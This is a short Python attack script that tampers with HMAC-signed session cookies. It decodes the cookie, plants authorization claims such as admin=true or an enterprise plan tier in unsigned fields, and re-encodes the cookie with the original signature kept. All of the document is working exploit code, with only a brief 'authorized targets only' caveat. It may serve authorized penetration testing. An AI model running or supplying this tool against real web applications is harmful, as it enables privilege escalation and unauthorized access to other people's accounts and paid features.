#!/usr/bin/env python3
"""forge_custom_session.py — tamper with a custom HMAC-signed session blob.

We do NOT forge the HMAC. We relocate/inject an authorization claim into an
UNSIGNED part of the session object (top-level, or a 'meta'/'claims'/'extra'
sub-object) and re-encode, keeping the original hmac. Use only on targets you
are authorized to test.

Usage:
  python3 forge_custom_session.py --cookie "$COOKIE" --inject meta.plan_tier=enterprise --inject meta.is_verified=true
  python3 forge_custom_session.py --cookie "$COOKIE" --inject admin=true --raw
"""
import argparse, base64, json, sys


def b64url_decode(t):
    t += "=" * (-len(t) % 4)
    return base64.urlsafe_b64decode(t)


def b64url_encode(b):
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def set_path(obj, dotted, value):
    # supports typed values: true/false/null/int/float, else string
    parts = dotted.split(".")
    cur = obj
    for p in parts[:-1]:
        cur = cur.setdefault(p, {})
        if not isinstance(cur, dict):
            raise SystemExit(f"path segment {p} is not an object")
    key = parts[-1]
    if value in ("true", "false"):
        v = value == "true"
    elif value == "null":
        v = None
    else:
        try:
            v = int(value)
        except ValueError:
            try:
                v = float(value)
            except ValueError:
                v = value
    cur[key] = v


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--cookie", required=True, help="raw session cookie value")
    ap.add_argument("--inject", action="append", default=[],
                    help="dotted.path=value to set in the UNSIGNED region")
    ap.add_argument("--raw", action="store_true",
                    help="print decoded JSON instead of re-encoded cookie")
    args = ap.parse_args()

    o = json.loads(b64url_decode(args.cookie))
    for spec in args.inject:
        if "=" not in spec:
            sys.exit(f"bad --inject {spec!r}, expected dotted.path=value")
        path, val = spec.split("=", 1)
        set_path(o, path, val)

    if args.raw:
        print(json.dumps(o, indent=2))
        return
    print(b64url_encode(json.dumps(o).encode()))


if __name__ == "__main__":
    main()
